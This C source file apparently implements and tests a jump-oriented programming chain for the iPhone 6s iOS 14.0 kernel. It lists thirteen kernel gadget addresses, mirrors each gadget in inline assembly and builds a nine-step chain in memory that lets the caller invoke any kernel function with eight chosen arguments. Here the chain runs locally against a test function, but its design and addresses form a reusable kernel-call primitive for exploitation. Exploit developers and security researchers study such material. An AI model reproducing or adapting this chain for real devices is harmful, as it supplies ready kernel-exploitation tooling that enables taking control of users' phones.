#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// jop4.c - 8-argument JOP chain targeted at kernel_6s_140 (iPhone 6s iOS 14.0).
// All gadgets used here have been verified to exist (at the listed static
// addresses) in the kernel_6s_140 binary's executable segments
// (__TEXT_EXEC / __PLK_TEXT_EXEC). No synthesized or substitute sequences.
//
// Calls into the chain via the existing my_call6 helper (unchanged).
// my_call6 hardcodes the 8th C-call slot to 0, so x7 enters prologue as 0;
// we recover x7 = x7_user inside the JOP chain via a two-step stash
// (mov_x16_x1__br_x2 to park x7_user in x16, then mov_x7_x16__br_x10).
//
// ABI NOTE (carried over from the iOS 13.7 port): The chain NEVER writes
// the callee-saved registers x21..x28. gadget_prologue only saves
// x19/x20/x29/x30, so any callee-saved register the chain touches would be
// left clobbered when prologue returns to its kernel caller. We use x20
// (prologue-restored) for x0_user and only caller-saved x10/x11/x12/x15/x16
// for everything else. x21..x28 are left untouched throughout the chain.
//
// All 13 gadgets used (verified by disassembly of kernel_6s_140):
//   gadget_populate     0xFFFFFFF006805B44  __PLK_TEXT_EXEC
//   gadget_prologue     0xFFFFFFF0066DCA84  __PLK_TEXT_EXEC  (identical 13-instruction sequence to iOS 13.7)
//   mov_x12_x0__br_x2   0xFFFFFFF0064D26F8  __PLK_TEXT_EXEC  (iter 1 Pattern B: x12 := populate)
//   mov_x0_x3__br_x4    0xFFFFFFF0074DF178  __TEXT_EXEC      (bridge A: restore x0, br populate)
//   mov_x0_x1__br_x2    0xFFFFFFF007235050  __TEXT_EXEC      (bridge B: alternate, used by iter 6)
//   mov_x15_x2__br_x3   0xFFFFFFF006544BA4  __PLK_TEXT_EXEC  (iter 2: x15 := x0_user)
//   mov_x20_x15__br_x12 0xFFFFFFF006561048  __PLK_TEXT_EXEC  (iter 3: x20 := x15 = x0_user)
//   mov_x11_x1__br_x12  0xFFFFFFF00665B4EC  __PLK_TEXT_EXEC  (iter 4: x11 := target_addr)
//   mov_x16_x1__br_x2   0xFFFFFFF006599430  __PLK_TEXT_EXEC  (iter 5: x16 := x7_user)
//   mov_x10_x12__br_x8  0xFFFFFFF006562880  __PLK_TEXT_EXEC  (iter 6: x10 := x12 = populate)
//   mov_x7_x16__br_x10  0xFFFFFFF006589788  __PLK_TEXT_EXEC  (iter 7: x7 := x16 = x7_user, br populate)
//   mov_x10_x0__br_x2   0xFFFFFFF0065A0BB8  __PLK_TEXT_EXEC  (iter 8 Pattern B: x10 := fixup_addr)
//   mov_x5_x8__br_x10   0xFFFFFFF006AD1608  __PLK_TEXT_EXEC  (delivery: x5 := x5_user, br fixup)
//   mov_x0_x20__br_x11  0xFFFFFFF0072FF92C  __TEXT_EXEC      (final fixup: x0 := x0_user, br target)

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

// 0xFFFFFFF006805B44  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp X5, X8, [X0,#0x10] \n"
        "ldp X1, X2, [X0,#0x20] \n"
        "ldp X3, X4, [X0,#0x30] \n"
        "mov X0, X8 \n"
        "br X5 \n"
    );
}

// 0xFFFFFFF0066DCA84  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n"
        "stp x29, x30, [sp, #0x10]\n"
        "add x29, sp, #0x10\n"
        "mov x19, x1\n"
        "ldr x0, [x0, #0x98]\n"
        "ldr x8, [x0]\n"
        "ldr x8, [x8, #0x7C0]\n"
        "blr x8\n"
        "str x0, [x19]\n"
        "mov w0, #0\n"
        "ldp x29, x30, [sp, #0x10]\n"
        "ldp x20, x19, [sp], #0x20\n"
        "ret\n"
    );
}

// 0xFFFFFFF0064D26F8  (__PLK_TEXT_EXEC)   mov x12, x0 ; br x2
__attribute__((naked)) void mov_x12_x0__br_x2(void) {
    __asm__ volatile (
        "mov x12, x0\n"
        "br x2\n"
    );
}

// 0xFFFFFFF0074DF178  (__TEXT_EXEC)       mov x0, x3 ; br x4    (bridge A)
__attribute__((naked)) void mov_x0_x3__br_x4(void) {
    __asm__ volatile (
        "mov x0, x3\n"
        "br x4\n"
    );
}

// 0xFFFFFFF007235050  (__TEXT_EXEC)       mov x0, x1 ; br x2    (bridge B)
__attribute__((naked)) void mov_x0_x1__br_x2(void) {
    __asm__ volatile (
        "mov x0, x1\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006544BA4  (__PLK_TEXT_EXEC)   mov x15, x2 ; br x3
__attribute__((naked)) void mov_x15_x2__br_x3(void) {
    __asm__ volatile (
        "mov x15, x2\n"
        "br x3\n"
    );
}

// 0xFFFFFFF006561048  (__PLK_TEXT_EXEC)   mov x20, x15 ; br x12
__attribute__((naked)) void mov_x20_x15__br_x12(void) {
    __asm__ volatile (
        "mov x20, x15\n"
        "br x12\n"
    );
}

// 0xFFFFFFF00665B4EC  (__PLK_TEXT_EXEC)   mov x11, x1 ; br x12
__attribute__((naked)) void mov_x11_x1__br_x12(void) {
    __asm__ volatile (
        "mov x11, x1\n"
        "br x12\n"
    );
}

// 0xFFFFFFF006599430  (__PLK_TEXT_EXEC)   mov x16, x1 ; br x2
__attribute__((naked)) void mov_x16_x1__br_x2(void) {
    __asm__ volatile (
        "mov x16, x1\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006562880  (__PLK_TEXT_EXEC)   mov x10, x12 ; br x8
__attribute__((naked)) void mov_x10_x12__br_x8(void) {
    __asm__ volatile (
        "mov x10, x12\n"
        "br x8\n"
    );
}

// 0xFFFFFFF006589788  (__PLK_TEXT_EXEC)   mov x7, x16 ; br x10
__attribute__((naked)) void mov_x7_x16__br_x10(void) {
    __asm__ volatile (
        "mov x7, x16\n"
        "br x10\n"
    );
}

// 0xFFFFFFF0065A0BB8  (__PLK_TEXT_EXEC)   mov x10, x0 ; br x2
__attribute__((naked)) void mov_x10_x0__br_x2(void) {
    __asm__ volatile (
        "mov x10, x0\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006AD1608  (__PLK_TEXT_EXEC)   mov x5, x8 ; br x10
__attribute__((naked)) void mov_x5_x8__br_x10(void) {
    __asm__ volatile (
        "mov x5, x8\n"
        "br x10\n"
    );
}

// 0xFFFFFFF0072FF92C  (__TEXT_EXEC)       mov x0, x20 ; br x11
__attribute__((naked)) void mov_x0_x20__br_x11(void) {
    __asm__ volatile (
        "mov x0, x20\n"
        "br x11\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size);
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, (void*)addr, size);
    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) =
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}


// Chain flow (9 populate iterations):
//
//   C --my_call6--> prologue --blr x8--> populate --iter 1..9--> target
//
//   The new kernel has FAR fewer convenient stash gadgets than iOS 13.7, so we
//   set up two "populate anchors" (x12 and x10) and use a 2-hop indirect path
//   for x20 (via x15) and for x7 (via x16). The chain uses two distinct
//   "bridge" gadgets:
//       bridge A = mov x0, x3 ; br x4      (used when [+0x30]=next_block, [+0x38]=populate)
//       bridge B = mov x0, x1 ; br x2      (used when [+0x20]=next_block, [+0x28]=populate)
//
//   Two stash patterns are used:
//       Pattern A: mov xD, x{1..4} ; br x{1..4}  -- direct, single gadget
//       Pattern B: mov xD, x0 ; br x2            -- source from mem[+0x18], chains
//                  through bridge A to next iter
//
//   ITER 1 (Pattern B):  x12 := populate                   (anchor for re-entry)
//   ITER 2 (Pattern A):  x15 := x0_user                    (intermediate for x20)
//   ITER 3:              x20 := x15 ; br x12=populate      (uses x12 anchor)
//   ITER 4:              x11 := target_addr ; br x12       (uses x12 anchor)
//   ITER 5 (Pattern A):  x16 := x7_user                    (intermediate for x7)
//   ITER 6:              x10 := x12 (=populate) ; br x8    (chains through bridge B to re-enter populate)
//   ITER 7:              x7  := x16 = x7_user ; br x10     (re-enters populate on next block)
//   ITER 8 (Pattern B):  x10 := fixup_addr (= mov_x0_x20__br_x11)
//   ITER 9 (DELIVERY):   populate -> mov_x5_x8__br_x10 -> mov_x0_x20__br_x11 -> target
//
//   Register state at target entry:
//     x0  = x0_user  (set by final fixup mov x0, x20)
//     x1  = x1_user  (set by delivery populate from mem[+0x20])
//     x2  = x2_user
//     x3  = x3_user
//     x4  = x4_user
//     x5  = x5_user  (set by mov_x5_x8 in delivery)
//     x6  = x6_user  (preserved end-to-end from C ABI)
//     x7  = x7_user  (set in iter 7)
//     x11 = target_addr (used to br, preserved through target)
//     x20 = x0_user (prologue's epilogue will restore to caller's x20 before returning)
//
//   Registers NEVER written by the chain: x19, x21..x28.
//   So when prologue returns, the kernel-side caller sees its callee-saved
//   register file intact.

#define BLK1   0x000   // iter 1 data block (= my_page itself; prologue passes my_page as x0)
#define BLK2   0x100
#define BLK3   0x180
#define BLK4   0x200
#define BLK5   0x280
#define BLK6   0x300
#define BLK7   0x380
#define BLK8   0x400
#define BLK9   0x480   // delivery
#define STORED_RET_OFF 0x500

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t mp = (uint64_t)my_page;

    // Pointer-chase graph used by prologue (assuming its x0 input = my_page):
    //   ldr x0, [x0, #0x98]   -> *(my_page+0x98)  = my_page
    //   ldr x8, [x0]          -> *my_page         = my_page
    //   ldr x8, [x8, #0x7C0]  -> *(my_page+0x7C0) = gadget_populate
    //   blr x8                -> enters populate with x0 = my_page (= iter 1 data block)
    write64(mp + 0x00,  mp);
    write64(mp + 0x98,  mp);
    write64(mp + 0x7C0, (uint64_t)gadget_populate);

    // ----- ITER 1 (Pattern B): x12 := populate -----
    //   populate sets x0 = x8 = populate (from [+0x18]) and x2 = bridgeA addr, etc.
    //   mov_x12_x0__br_x2: x12 := x0 = populate, br x2 = bridgeA
    //   bridgeA: mov x0, x3 (= BLK2), br x4 (= populate). Re-enters populate on BLK2.
    write64(mp + BLK1 + 0x10, (uint64_t)mov_x12_x0__br_x2);
    write64(mp + BLK1 + 0x18, (uint64_t)gadget_populate);    // -> x0=x8 (mov'd to x12)
    write64(mp + BLK1 + 0x28, (uint64_t)mov_x0_x3__br_x4);   // -> x2 (br target = bridgeA)
    write64(mp + BLK1 + 0x30, mp + BLK2);                    // -> x3 (bridgeA: x0 := this)
    write64(mp + BLK1 + 0x38, (uint64_t)gadget_populate);    // -> x4 (bridgeA: br x4 = populate)

    // ----- ITER 2 (Pattern A): x15 := x0_user -----
    write64(mp + BLK2 + 0x10, (uint64_t)mov_x15_x2__br_x3);
    write64(mp + BLK2 + 0x18, mp + BLK3);                    // -> next block
    write64(mp + BLK2 + 0x28, x0);                           // -> x2 (mov'd to x15)
    write64(mp + BLK2 + 0x30, (uint64_t)gadget_populate);    // -> x3 (br target)

    // ----- ITER 3: x20 := x15 (= x0_user), re-enter populate via x12 -----
    //   populate sets x0 = BLK4 (from [+0x18]); mov_x20_x15 doesn't touch x0.
    //   br x12 = populate runs on x0 = BLK4 correctly.
    write64(mp + BLK3 + 0x10, (uint64_t)mov_x20_x15__br_x12);
    write64(mp + BLK3 + 0x18, mp + BLK4);

    // ----- ITER 4: x11 := target_addr, re-enter populate via x12 -----
    write64(mp + BLK4 + 0x10, (uint64_t)mov_x11_x1__br_x12);
    write64(mp + BLK4 + 0x18, mp + BLK5);
    write64(mp + BLK4 + 0x20, addr);                         // -> x1 (mov'd to x11)

    // ----- ITER 5 (Pattern A): x16 := x7_user -----
    write64(mp + BLK5 + 0x10, (uint64_t)mov_x16_x1__br_x2);
    write64(mp + BLK5 + 0x18, mp + BLK6);
    write64(mp + BLK5 + 0x20, x7);                           // -> x1 (mov'd to x16)
    write64(mp + BLK5 + 0x28, (uint64_t)gadget_populate);    // -> x2 (br target)

    // ----- ITER 6: x10 := x12 (= populate), chain through bridgeB to re-enter populate -----
    //   populate sets x5 = mov_x10_x12_br_x8, x0 = x8 = bridgeB addr (from [+0x18]).
    //   mov_x10_x12: x10 := x12 = populate. br x8 = bridgeB.
    //   bridgeB (mov x0, x1 ; br x2): x0 := x1 = BLK7, br x2 = populate. Re-enters on BLK7.
    write64(mp + BLK6 + 0x10, (uint64_t)mov_x10_x12__br_x8);
    write64(mp + BLK6 + 0x18, (uint64_t)mov_x0_x1__br_x2);   // -> x0=x8 (br target = bridgeB)
    write64(mp + BLK6 + 0x20, mp + BLK7);                    // -> x1 (bridgeB: x0 := this)
    write64(mp + BLK6 + 0x28, (uint64_t)gadget_populate);    // -> x2 (bridgeB: br x2 = populate)

    // ----- ITER 7: x7 := x16 (= x7_user), re-enter populate via x10 -----
    write64(mp + BLK7 + 0x10, (uint64_t)mov_x7_x16__br_x10);
    write64(mp + BLK7 + 0x18, mp + BLK8);

    // ----- ITER 8 (Pattern B): x10 := fixup_addr (overwrites x10 = populate) -----
    //   Same structure as iter 1 but stashing fixup instead of populate.
    write64(mp + BLK8 + 0x10, (uint64_t)mov_x10_x0__br_x2);
    write64(mp + BLK8 + 0x18, (uint64_t)mov_x0_x20__br_x11); // -> x0 (mov'd to x10 = fixup)
    write64(mp + BLK8 + 0x28, (uint64_t)mov_x0_x3__br_x4);   // -> x2 (br target = bridgeA)
    write64(mp + BLK8 + 0x30, mp + BLK9);                    // -> x3 (bridgeA: x0 := delivery block)
    write64(mp + BLK8 + 0x38, (uint64_t)gadget_populate);    // -> x4 (bridgeA: br x4 = populate)

    // ----- ITER 9 (DELIVERY) -----
    //   populate: x5 = mov_x5_x8_br_x10, x8 = x5_user, x1..x4 = user args
    //   br x5 -> mov x5,x8 : x5 := x5_user, br x10 (= fixup) -> mov x0,x20 : x0 := x0_user, br x11 (= target)
    write64(mp + BLK9 + 0x10, (uint64_t)mov_x5_x8__br_x10);
    write64(mp + BLK9 + 0x18, x5);
    write64(mp + BLK9 + 0x20, x1);
    write64(mp + BLK9 + 0x28, x2);
    write64(mp + BLK9 + 0x30, x3);
    write64(mp + BLK9 + 0x38, x4);

    uint64_t STORED_RET = mp + STORED_RET_OFF;

    // Dispatch into prologue through my_call6 (unchanged).
    // my_call6 ultimately performs: func(a1, a2, a3, a4, a5, a6, a7, 0)
    // so the C-ABI register loading is:
    //   x0 = a1 = mp;  x1 = a2 = STORED_RET;  x2..x5 = 0 (don't care);
    //   x6 = a7 = x6_user;  x7 = 0 (hardcoded by my_call6, recovered to x7_user in iter 7)
    // x21..x28 are never touched.
    my_call6((uint64_t)gadget_prologue,
             mp,           // a1 -> x0
             STORED_RET,   // a2 -> x1
             0,            // a3 -> x2 (don't care)
             0,            // a4 -> x3 (don't care)
             0,            // a5 -> x4 (don't care)
             0,            // a6 -> x5 (don't care)
             x6);          // a7 -> x6

    return read64(STORED_RET);
}


int main(int argc, char *argv[], char *envp[]) {
#if 0
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6((uint64_t)func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop((uint64_t)func_arg8,
                             0xdeadbeef41424340, 0xdeadbeef41424341,
                             0xdeadbeef41424342, 0xdeadbeef41424343,
                             0xdeadbeef41424344, 0xdeadbeef41424345,
                             0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);
    // Expected output (all 8 arguments delivered correctly):
    //   a1 = 0xdeadbeef41424340
    //   a2 = 0xdeadbeef41424341
    //   a3 = 0xdeadbeef41424342
    //   a4 = 0xdeadbeef41424343
    //   a5 = 0xdeadbeef41424344
    //   a6 = 0xdeadbeef41424345
    //   a7 = 0xdeadbeef41424346
    //   a8 = 0xdeadbeef41424347

    return 0;
}